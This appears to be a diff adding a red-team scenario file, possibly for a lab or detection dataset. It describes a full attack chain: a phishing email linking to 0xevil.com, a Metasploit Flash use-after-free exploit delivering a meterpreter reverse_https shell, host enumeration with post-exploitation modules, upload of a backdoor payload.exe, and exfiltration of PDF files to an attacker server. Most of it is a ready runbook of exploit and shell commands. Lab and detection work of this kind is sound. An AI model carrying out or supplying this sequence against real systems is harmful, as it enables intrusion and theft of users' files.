@@ -1,0 +1,34 @@
+Attack high-level description:
+The user logs in to Gmail, open the malicious email, which has a link to the malicious website 0xevil.com:9999, the browser is vulnerable to Flash vulnerability. After the user clicks on the link, a new connection is established to 0xevil.com:8888, to fetch and inject meterpreter HTTPS payload to firefox process. The user use the gained access to gather information and to drop additional payload to the system (payload.exe). The malicious payload sweeps the system to collect high-profile PDF files, then it opens a HTTPS connection to 0xevil:8080 to exfiltrate the pdf files.
+
+
+Attack steps and commands:
+
+0- Run the exfiltration server:
+python exfiltration-https-server.py
+
+1- Start Metasploit exploit:
+use exploit/multi/browser/adobe_flash_opaque_background_uaf
+set payload windows/meterpreter/reverse_https
+exploit
+
+2- Send the phishing email to the target.
+3- The user clicks the malicious link, and the attacker gets a remote shell.
+
+4- Attacker performs the following shell commands using meterpreter shell and Windows console (i.e., cmd.exe):
+getuid (to show the logged-in user information)
+pwd (to show the current directory)
+ps (to list the active processes)
+ipconfig (to list the IP information)
+run post/windows/gather/usb_history (enumerates the USB drive history)
+run post/windows/gather/enum_shares (enumerates recent shares)
+run post/windows/gather/enum_logged_on_users (enumerates logged on users)
+cd ../../../../.. (traverse back to C:\ drive)
+cd Users/admin
+ls (list the files)
+upload payload.exe (upload a backdoor)
+shell (spawn a shell (i.e., cmd.exe))
+> payload.exe (run the payload to exfiltrate pdf files)
+> exit (kill the shell process)
+
+5 - The attacker receive the pdf files using the exfiltration server, which dedicate a folder per host to store the files.
